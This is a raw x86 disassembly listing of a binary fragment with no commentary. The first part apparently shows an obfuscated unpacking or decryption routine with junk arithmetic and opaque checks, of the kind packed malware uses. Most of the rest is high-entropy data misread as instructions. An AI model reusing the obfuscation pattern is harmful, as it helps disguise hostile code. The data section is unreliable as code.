  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4323f7
  421818:	mov    edx,DWORD PTR ds:0x4323ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4323f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4323f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4323f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4323f7
  42186b:	mov    ds:0x4323ff,eax
  421870:	mov    eax,ds:0x432373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x432ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x432ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x432ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x432e77
  4218d2:	call   DWORD PTR ds:0x43fdf7
  4218d8:	cmp    DWORD PTR ds:0x432ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x432ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x432ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x432ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x432ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x432e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x432e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x432e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x432e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x432e43,0x432ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x432ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x432e33
  421969:	or     DWORD PTR ds:0x432e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x432e2b,0x432e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x432e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x432e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x432e23,0x432e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x432e37
  4219b8:	add    eax,DWORD PTR ds:0x432ebf
  4219be:	mov    ds:0x432e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x432e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x432e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x432e4b,0x432e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x432e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x432e9f,0x432e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x432e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x432ea7
  421ab6:	sub    DWORD PTR ds:0x432e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0x21bd524a],al
  421ace:	adc    ebx,DWORD PTR [edi+0x53]
  421ad1:	outs   dx,DWORD PTR ds:[esi]
  421ad2:	mov    dh,0x82
  421ad4:	sbb    DWORD PTR [edx+0x60],0xffffff83
  421ad8:	cmp    DWORD PTR [ecx+0x46],0x42
  421adc:	mov    bh,0x5a
  421ade:	mov    esp,0xa8472ab8
  421ae3:	in     al,dx
  421ae4:	inc    eax
  421ae5:	fist   WORD PTR [edx+edx*8-0x63567cde]
  421aec:	mov    ebp,0xed1ba1c2
  421af1:	out    0xff,eax
  421af3:	xchg   BYTE PTR [edx-0x14],dl
  421af6:	test   BYTE PTR [esi],0x1
  421af9:	add    ebx,ebx
  421afb:	bt     esp,esi
  421afe:	sbb    eax,0xfc0b2e55
  421b03:	xor    DWORD PTR [esi+0x9],edx
  421b06:	mov    ecx,0x10ac9a77
  421b0b:	inc    edx
  421b0c:	ins    BYTE PTR es:[edi],dx
  421b0d:	std    
  421b0e:	push   ebp
  421b0f:	mov    BYTE PTR [esi+ebx*4-0x44],cl
  421b13:	adc    al,0xdd
  421b15:	test   al,0xf7
  421b17:	shr    BYTE PTR [ebx+eiz*1-0x27],cl
  421b1b:	js     0x421b2e
  421b1d:	lds    ecx,FWORD PTR [ebx+ecx*1-0x2dd50e01]
  421b24:	aad    0x44
  421b26:	fisttp WORD PTR [ebx-0x4905703d]
  421b2c:	clc    
  421b2d:	ds mov bl,0xb7
  421b30:	push   0xffffffe5
  421b32:	hlt    
  421b33:	jmp    ecx
  421b35:	loope  0x421b39
  421b37:	fwait
  421b38:	push   es
  421b39:	mov    BYTE PTR [esi+0x1],0x26
  421b3d:	mov    ecx,0x9d9b9f65
  421b42:	pop    edi
  421b43:	push   ebx
  421b44:	stos   DWORD PTR es:[edi],eax
  421b45:	jp     0x421b2f
  421b47:	dec    esp
  421b48:	add    BYTE PTR [edi],ah
  421b4a:	push   eax
  421b4b:	and    cl,BYTE PTR [ebp+edi*2-0x78]
  421b4f:	ja     0x421b1c
  421b51:	fiadd  WORD PTR [ecx+0x1572e95f]
  421b57:	dec    esi
  421b58:	fimul  WORD PTR [ecx+ebp*8]
  421b5b:	fwait
  421b5c:	mov    eax,0x9c64c870
  421b61:	bound  edx,QWORD PTR [edx]
  421b63:	stos   BYTE PTR es:[edi],al
  421b64:	stc    
  421b65:	rol    cl,0x82
  421b68:	ss gs mov db6,eax
  421b6d:	(bad)  
  421b6e:	shl    ebp,cl
  421b70:	adc    al,0xf
  421b72:	add    al,0xc3
  421b74:	push   ebx
  421b76:	jb     0x421bcc
  421b78:	push   esp
  421b79:	add    al,BYTE PTR [ecx]
  421b7b:	push   0xd076606d
  421b80:	aam    0x54
  421b82:	adc    BYTE PTR [eiz*4-0x4efcc3be],dl
  421b89:	push   ss
  421b8a:	(bad)  
  421b8b:	mov    ch,0x4b
  421b8d:	dec    eax
  421b8e:	lea    ebx,gs:[eax]
  421b91:	fnstsw WORD PTR [ecx]
  421b93:	movntps XMMWORD PTR [edx-0x7a],xmm3
  421b97:	cwde   
  421b98:	or     BYTE PTR [ebx-0x5dcc2b41],ch
  421b9e:	adc    eax,0x3e1e2365
  421ba3:	dec    esp
  421ba4:	xchg   ecx,eax
  421ba5:	addr16 xchg ecx,eax
  421ba7:	jl     0x421b36
  421ba9:	mov    esi,0xcf68eb9c
  421bae:	jae    0x421bf3
  421bb0:	inc    eax
  421bb1:	sub    BYTE PTR [ebp+0x7d],bh
  421bb4:	xchg   ebx,eax
  421bb5:	nop
  421bb6:	inc    edx
  421bb7:	mov    eax,ds:0x5b1c3aea
  421bbc:	ins    DWORD PTR es:[edi],dx
  421bbd:	cs es clc 
  421bc0:	aas    
  421bc1:	push   esp
  421bc2:	sbb    eax,0xe0a8829
  421bc7:	push   ecx
  421bc8:	cwde   
  421bc9:	xor    dl,BYTE PTR [ebp+ebx*2-0x14]
  421bcd:	inc    ebp
  421bce:	push   ss
  421bcf:	mov    ebx,0x2769d670
  421bd4:	mov    esi,0x705c0573
  421bd9:	xor    DWORD PTR [eax+0x49],0x51
  421bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bde:	mov    eax,0x900274a8
  421be3:	mov    cl,0x50
  421be5:	iret   
  421be6:	fld    TBYTE PTR [ecx]
  421be8:	leave  
  421be9:	enter  0x55bd,0xf6
  421bed:	mov    eax,0xfad70e6
  421bf2:	in     al,dx
  421bf3:	stos   DWORD PTR es:[edi],eax
  421bf4:	imul   ebp,ebx,0xffffffc9
  421bf7:	add    eax,0xf8ee28eb
  421bfc:	lea    edi,[ebp-0x6a]
  421bff:	repz push ebp
  421c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c02:	leave  
  421c03:	mov    bl,0xc6
  421c05:	xor    al,0x4e
  421c07:	push   eax
  421c08:	repnz and DWORD PTR [eax+0x681f8d42],edi
  421c0f:	xor    al,0xdc
  421c11:	(bad)  [edx-0x234e8ae6]
  421c17:	(bad)  
  421c18:	shl    BYTE PTR [ecx+esi*2+0x5c],1
  421c1c:	fcomp  QWORD PTR [edi-0x20]
  421c1f:	jmp    0x3c4e708
  421c24:	jg     0x421c9a
  421c26:	std    
  421c27:	fsub   QWORD PTR cs:[eax-0x44e35e0]
  421c2e:	inc    ecx
  421c2f:	mov    cs,ebp
  421c31:	mov    ch,0x7d
  421c33:	pop    ecx
  421c34:	jp     0x421bbb
  421c36:	mov    esp,0x58134dfe
  421c3b:	sub    BYTE PTR [edi+0x475127c5],0xa5
  421c42:	mov    ds:0x64419cd2,eax
  421c47:	push   edx
  421c48:	jg     0x421c7c
  421c4a:	xor    eax,0xca13aa59
  421c4f:	mov    ecx,0xcf9cfd62
  421c54:	test   BYTE PTR [edi-0x1c],cl
  421c57:	sbb    ebp,DWORD PTR [ebp+ebp*1-0x3e]
  421c5b:	mov    dl,dh
  421c5d:	add    bl,cl
  421c5f:	mov    ah,0xa0
  421c61:	push   ebx
  421c62:	or     BYTE PTR [ecx+0x55],bl
  421c65:	or     ah,BYTE PTR [esi]
  421c67:	loope  0x421c83
  421c69:	fcomp  DWORD PTR [ebx+0xb]
  421c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c6d:	int    0xdc
  421c6f:	jnp    0x421c57
  421c71:	fwait
  421c72:	clc    
  421c73:	inc    ecx
  421c74:	fisttp QWORD PTR [esi-0x5d80a02c]
  421c7a:	test   eax,0xf5d6defb
  421c7f:	mov    al,ds:0xde10056d
  421c84:	mov    ch,0x25
  421c86:	mov    dl,dh
  421c88:	jecxz  0x421c0b
  421c8a:	sar    BYTE PTR [ecx+0x38],1
  421c8d:	pop    ebx
  421c8e:	sbb    ebx,DWORD PTR [edx]
  421c90:	and    eax,0xfb2a9da4
  421c96:	js     0x421c21
  421c98:	mov    ?,WORD PTR [esi-0x80]
  421c9b:	out    dx,eax
  421c9c:	add    ebp,DWORD PTR [ecx-0x5]
  421c9f:	mov    bh,0xbc
  421ca1:	in     eax,dx
  421ca2:	jb     0x421d22
  421ca4:	jo     0x421d20
  421ca6:	int    0xc8
  421ca8:	ins    BYTE PTR es:[edi],dx
  421ca9:	mov    BYTE PTR [ebp-0x3b63b5cc],bh
  421caf:	outs   dx,BYTE PTR ds:[esi]
  421cb0:	rcr    DWORD PTR [ebx-0x39],cl
  421cb3:	inc    edx
  421cb4:	mov    ah,0xf
  421cb6:	mov    ch,0x96
  421cb8:	sbb    esi,DWORD PTR [ebx]
  421cba:	jne    0x421cca
  421cbc:	xlat   BYTE PTR ds:[ebx]
  421cbd:	enter  0x6fa9,0xda
  421cc1:	test   eax,0x1f2bc683
  421cc6:	and    ebx,eax
  421cc8:	loop   0x421c8f
  421cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ccb:	add    edi,DWORD PTR [esp-0x523db26a]
  421cd2:	mov    edi,0xfe56f22d
  421cd7:	js     0x421cee
  421cd9:	outs   dx,BYTE PTR ds:[esi]
  421cda:	adc    al,0xfe
  421cdc:	lods   al,BYTE PTR cs:[esi]
  421cde:	inc    ecx
  421cdf:	pop    esi
  421ce0:	mov    ch,0x7a
  421ce2:	mov    ds:0xc978c4f3,eax
  421ce7:	lock test BYTE PTR [ebp+0x1e],dl
  421ceb:	retw   
  421ced:	pop    ss
  421cee:	stos   DWORD PTR es:[edi],eax
  421cef:	mov    dl,0x7e
  421cf1:	call   edx
  421cf3:	pop    esi
  421cf4:	repnz in eax,0x5e
  421cf7:	into   
  421cf8:	xchg   ecx,eax
  421cf9:	mov    bh,0xf0
  421cfb:	cmp    DWORD PTR [ebp+0x1b],edx
  421cfe:	adc    edi,DWORD PTR [esi-0x188f6463]
  421d04:	fimul  DWORD PTR [ecx-0x1c]
  421d07:	int    0xf3
  421d09:	inc    esi
  421d0a:	repnz mov esi,0x6c569b6e
  421d10:	cdq    
  421d11:	mov    ah,0x2b
  421d13:	clc    
  421d14:	shr    BYTE PTR [ebx+edx*2-0x905eb00],cl
  421d1b:	sbb    eax,DWORD PTR [esi+0x26ca16de]
  421d21:	ins    BYTE PTR es:[edi],dx
  421d22:	sti    
  421d23:	add    al,0xb4
  421d25:	sahf   
  421d26:	pop    eax
  421d27:	mov    cl,0x17
  421d29:	push   ecx
  421d2a:	outs   dx,DWORD PTR ds:[esi]
  421d2b:	add    BYTE PTR [eax-0x45],0xe2
  421d2f:	push   edx
  421d30:	ins    DWORD PTR es:[edi],dx
  421d31:	adc    esp,DWORD PTR [edi-0x3c2ade79]
  421d37:	ret    
  421d38:	mov    bl,0x6b
  421d3a:	push   0xffffffa8
  421d3c:	push   es
  421d3d:	rcl    ch,1
  421d3f:	in     eax,dx
  421d40:	xor    ebp,edi
  421d42:	sbb    ebx,ebp
  421d44:	rcl    BYTE PTR [ecx],0xda
  421d47:	push   edi
  421d48:	mov    ds:0x97b083c,eax
  421d4d:	outs   dx,BYTE PTR ds:[esi]
  421d4e:	push   esp
  421d4f:	dec    eax
  421d50:	sub    BYTE PTR [esi],0xcd
  421d53:	push   ecx
  421d54:	(bad)  
  421d55:	call   0xd83f:0xd265dc49
  421d5c:	mov    ds:0x2695a0df,eax
  421d61:	mov    al,ds:0x3ecd7075
  421d66:	xlat   BYTE PTR ds:[ebx]
  421d67:	sub    DWORD PTR [eax-0x625e25f5],edi
  421d6d:	pop    edi
  421d6e:	fsub   DWORD PTR [edx]
  421d70:	pop    edx
  421d71:	outs   dx,BYTE PTR ds:[si]
  421d73:	xor    BYTE PTR [ebx],bh
  421d75:	xchg   DWORD PTR [edi-0x5a],ebp
  421d78:	pop    edi
  421d79:	fwait
  421d7a:	xchg   ebp,eax
  421d7b:	adc    al,0xcd
  421d7d:	ret    
  421d7e:	xrelease mov BYTE PTR [edx+0x204e1318],cl
  421d85:	xor    bl,BYTE PTR [ebp-0x1b]
  421d88:	loopne 0x421d2a
  421d8a:	xchg   ecx,eax
  421d8b:	jne    0x421daf
  421d8d:	enter  0x127b,0x8a
  421d91:	ja     0x421de6
  421d93:	cmp    ch,bl
  421d95:	leave  
  421d96:	inc    BYTE PTR [ecx]
  421d98:	xchg   ebp,eax
  421d99:	in     eax,0x6
  421d9b:	cmp    DWORD PTR ds:0x3612768b,0x5c
  421da2:	nop
  421da3:	lods   al,BYTE PTR ds:[esi]
  421da4:	(bad)  
  421da5:	hlt    
  421da6:	mov    dh,0x9
  421da8:	imul   BYTE PTR [ebx+edi*4]
  421dab:	lahf   
  421dac:	clc    
  421dad:	pop    edx
  421dae:	push   eax
  421daf:	xchg   DWORD PTR [edx],esi
  421db1:	and    DWORD PTR [edx-0x7a4e5849],0x2d
  421db8:	mov    eax,ds:0x29d9356e
  421dbd:	push   ebp
  421dbe:	or     DWORD PTR [ebx-0x50ed2d90],esp
  421dc4:	mov    bl,0x20
  421dc6:	sbb    BYTE PTR [eax],bl
  421dc8:	sub    DWORD PTR [edi+0x19],esi
  421dcb:	stos   DWORD PTR es:[edi],eax
  421dcc:	jecxz  0x421e1b
  421dce:	sbb    cl,dl
  421dd0:	in     al,0x81
  421dd2:	inc    edx
  421dd3:	std    
  421dd4:	cwde   
  421dd5:	into   
  421dd6:	mov    dh,BYTE PTR [esi]
  421dd8:	jecxz  0x421e10
  421dda:	shl    BYTE PTR [esi],0x27
  421ddd:	sahf   
  421dde:	les    esp,FWORD PTR [edx]
  421de0:	popa   
  421de1:	iret   
  421de2:	les    ebp,FWORD PTR [eax]
  421de4:	mov    edx,DWORD PTR [eax+0x33]
  421de7:	cdq    
  421de8:	mov    eax,0x97b6c32e
  421ded:	out    dx,eax
  421dee:	mov    dh,0xd4
  421df0:	jmp    0xe689:0x8543e047
  421df7:	in     eax,0x25
  421df9:	push   edi
  421dfb:	lahf   
  421dfc:	iret   
  421dfd:	js     0x421e49
  421dff:	adc    BYTE PTR [eax-0x2e],0x13
  421e03:	leave  
  421e04:	pop    ds
  421e05:	push   DWORD PTR [edx-0x2c]
  421e08:	add    BYTE PTR [esi-0x41c05767],al
  421e0e:	cmp    al,0xc2
  421e10:	(bad)  
  421e11:	xchg   ebx,eax
  421e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e13:	ficom  WORD PTR [ebx-0x15]
  421e16:	data16 ja 0x421e77
  421e19:	in     eax,0x22
  421e1b:	aad    0xdb
  421e1d:	mov    al,0xd4
  421e1f:	repnz out dx,al
  421e21:	int3   
  421e22:	jmp    0x3cff:0xd09d894c
  421e29:	push   ds
  421e2a:	(bad)  
  421e2b:	cld    
  421e2c:	xor    BYTE PTR [ecx+eax*2],cl
  421e2f:	push   0xef21e505
  421e34:	lea    edi,[esi+0x223c4b24]
  421e3a:	sbb    dh,ah
  421e3c:	jmp    0x6579:0x99283bf8
  421e43:	bound  esp,QWORD PTR [eax+0x7e]
  421e46:	sub    DWORD PTR [eax+0x23],ebp
  421e49:	xor    dl,ch
  421e4b:	mov    eax,0x7ed163aa
  421e50:	mov    edx,0x1054d0fb
  421e55:	mov    esp,eax
  421e57:	lahf   
  421e58:	adc    esi,DWORD PTR [esi-0x63596198]
  421e5e:	or     al,0xce
  421e60:	stc    
  421e61:	pop    ecx
  421e62:	out    0x18,eax
  421e64:	sub    ch,cl
  421e66:	popa   
  421e67:	jmp    0x421e28
  421e69:	xor    BYTE PTR [ebp+0x33],ch
  421e6c:	jecxz  0x421e59
  421e6e:	pop    ebp
  421e6f:	xchg   edi,eax
  421e70:	aaa    
  421e71:	scas   al,BYTE PTR es:[edi]
  421e72:	lock lea eax,[ecx]
  421e75:	mov    edi,edx
  421e77:	jge    0x421e24
  421e79:	(bad)  
  421e7a:	push   ecx
  421e7b:	push   edi
  421e7c:	inc    ecx
  421e7d:	mov    edx,0x69a5b351
  421e82:	push   0xffffffab
  421e84:	pop    ds
  421e85:	shr    DWORD PTR [eax-0x1a1bbc18],0x3e
  421e8c:	imul   ebp,esi,0x29bb76c
  421e92:	fistp  DWORD PTR [ebp+0x4bae875b]
  421e98:	mov    al,ds:0xc01287d8
  421e9d:	mov    ds:0x1c31c06e,al
  421ea2:	push   ds
  421ea3:	push   eax
  421ea4:	mov    cl,0x6d
  421ea6:	adc    al,0x54
  421ea8:	stc    
  421ea9:	push   edx
  421eaa:	mov    edx,0xd9ae6156
  421eaf:	rcr    esi,1
  421eb1:	rcr    ebx,cl
  421eb3:	es adc eax,0x61240739
  421eb9:	add    DWORD PTR [ebx],edi
  421ebb:	pop    ds
  421ebc:	mov    al,ds:0x5167caaa
  421ec1:	inc    edx
  421ec2:	jb     0x421e78
  421ec4:	ret    0x8144
  421ec7:	rol    DWORD PTR [eax-0x1b21324],1
  421ecd:	xor    al,0xec
  421ecf:	xlat   BYTE PTR ds:[ebx]
  421ed0:	mov    BYTE PTR [ebp+0xe2524db],bh
  421ed6:	jb     0x421f33
  421ed8:	mov    WORD PTR [edi+0x5e],?
  421edb:	mov    ds:0xcd6b8feb,al
  421ee0:	xor    cl,BYTE PTR [ebx]
  421ee2:	dec    eax
  421ee3:	xchg   dh,bh
  421ee5:	sub    DWORD PTR [ebx-0x6b209d77],edi
  421eeb:	daa    
  421eec:	fild   DWORD PTR [ebp+0x0]
  421eef:	push   ecx
  421ef0:	push   ebx
  421ef1:	adc    bl,BYTE PTR [esi-0x784a232b]
  421ef7:	out    0xef,al
  421ef9:	aas    
  421efa:	pop    esi
  421efb:	or     eax,0x7292f2c0
  421f00:	lock loopne 0x421ea9
  421f03:	mov    ds:0xf9986127,eax
  421f08:	push   0x2b
  421f0a:	xchg   bl,dh
  421f0c:	cmp    ah,dh
  421f0e:	jne    0x421f56
  421f10:	fcmovnb st,st(6)
  421f12:	pop    ss
  421f13:	icebp  
  421f14:	push   esp
  421f15:	(bad)  
  421f16:	sbb    DWORD PTR [ebx+0x63],esp
  421f19:	outs   dx,DWORD PTR ds:[esi]
  421f1a:	add    al,0xb5
  421f1c:	jns    0x421f27
  421f1e:	retf   
  421f1f:	adc    ah,dh
  421f21:	loopne 0x421f45
  421f23:	and    esp,DWORD PTR [eax+0x40]
  421f26:	cwde   
  421f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f28:	icebp  
  421f29:	aad    0x6f
  421f2b:	lods   eax,DWORD PTR ds:[esi]
  421f2c:	call   0x14954b6f
  421f31:	mov    bh,0xff
  421f33:	push   edi
  421f34:	inc    ecx
  421f35:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f37:	mov    ds:0x44862c6e,eax
  421f3c:	jbe    0x421f65
  421f3e:	dec    ebx
  421f3f:	push   0x78
  421f41:	pop    ss
  421f42:	ds inc ebx
  421f44:	cmp    al,0x86
  421f46:	push   cs
  421f47:	xchg   esi,eax
  421f48:	add    eax,0x6b608332
  421f4d:	mov    eax,ds:0x95fff976
  421f52:	rcr    BYTE PTR [edi-0x40],cl
  421f55:	js     0x421f6c
  421f57:	pop    ss
  421f58:	xor    ah,bh
  421f5a:	mov    cl,0x73
  421f5c:	dec    ecx
  421f5d:	push   edi
  421f5e:	imul   BYTE PTR [eax+0x7ab04c62]
  421f64:	cmp    BYTE PTR [eax+0x2c],dh
  421f67:	mov    WORD PTR ds:0x1887c92f,ss
  421f6d:	lea    edx,[ebp+0x5d8314c]
  421f73:	jbe    0x421fa7
  421f75:	push   esp
  421f76:	mov    eax,ds:0xc43de7d3
  421f7b:	mov    ecx,0xcaa4f7a6
  421f80:	xor    DWORD PTR [esi+0x491e0e29],edx
  421f86:	in     eax,dx
  421f87:	in     eax,dx
  421f88:	iret   
  421f89:	daa    
  421f8a:	repz jne 0x421f86
  421f8d:	fsub   QWORD PTR [ebp+0x72faf2f2]
  421f93:	inc    esp
  421f94:	enter  0xaa7d,0xc7
  421f98:	ins    BYTE PTR es:[edi],dx
  421f99:	inc    edx
  421f9a:	mov    WORD PTR [ebx],cs
  421f9c:	daa    
  421f9d:	add    ch,BYTE PTR [edi+0x9]
  421fa0:	mov    ds:0x27986192,eax
  421fa5:	sub    al,0x6d
  421fa7:	inc    edx
  421fa8:	sbb    edi,DWORD PTR [ecx+0x41]
  421fab:	push   es
  421fac:	sbb    bh,BYTE PTR [ecx+0x6fa2b240]
  421fb2:	test   eax,0xb79a17ea
  421fb7:	ins    BYTE PTR es:[edi],dx
  421fb8:	push   ds
  421fb9:	mov    eax,0xc1330e11
  421fbe:	cs xor eax,0x709df6d0
  421fc4:	xchg   esp,eax
  421fc5:	inc    ebx
  421fc6:	ret    0x7d73
  421fc9:	jge    0x42203b
  421fcb:	test   DWORD PTR [esi+0x3f],ebp
  421fce:	or     al,0x41
  421fd0:	lods   eax,DWORD PTR cs:[esi]
  421fd2:	fst    QWORD PTR [edi+0x6ee271a0]
  421fd8:	imul   esp,DWORD PTR [eax-0x4f],0xe2db2f1f
  421fdf:	jp     0x421f83
  421fe1:	cld    
  421fe2:	cmp    ecx,DWORD PTR [eax+0x11415d59]
  421fe8:	push   edx
  421fe9:	dec    esi
  421fea:	sbb    al,0xb3
  421fec:	pusha  
  421fed:	cmp    al,BYTE PTR [esi+0x29]
  421ff0:	mov    esi,0xd983e343
  421ff5:	mov    ebp,DWORD PTR [ebp+0x6f4f5ee8]
  421ffb:	iret   
  421ffc:	in     eax,dx
  421ffd:	jb     0x422009
  421fff:	cdq    
  422000:	(bad)  
  422001:	in     eax,dx
  422002:	sbb    edx,esi
  422004:	ret    
  422005:	gs ins BYTE PTR es:[edi],dx
  422007:	adc    eax,0x7e1a05b0
  42200c:	and    BYTE PTR [esi-0x67],bl
  42200f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422010:	mov    esp,0xaf9d50fb
  422015:	mov    BYTE PTR [edi],dl
  422017:	xor    dh,ah
  422019:	sub    eax,0xb6797ab1
  42201e:	cmc    
  42201f:	mov    bh,0xf3
  422021:	sbb    ebp,DWORD PTR [esi]
  422023:	lahf   
  422024:	sar    DWORD PTR [eax-0x27],cl
  422027:	out    0x51,eax
  422029:	xchg   DWORD PTR [ecx],edx
  42202b:	mov    esp,0xc87910aa
  422030:	or     edx,DWORD PTR [eax]
  422032:	xchg   edx,eax
  422033:	test   eax,0x235bcf16
  422038:	int    0xaa
  42203a:	jno    0x4220b9
  42203c:	pop    ss
  42203d:	pop    eax
  42203e:	mov    bl,0x4a
  422040:	push   esp
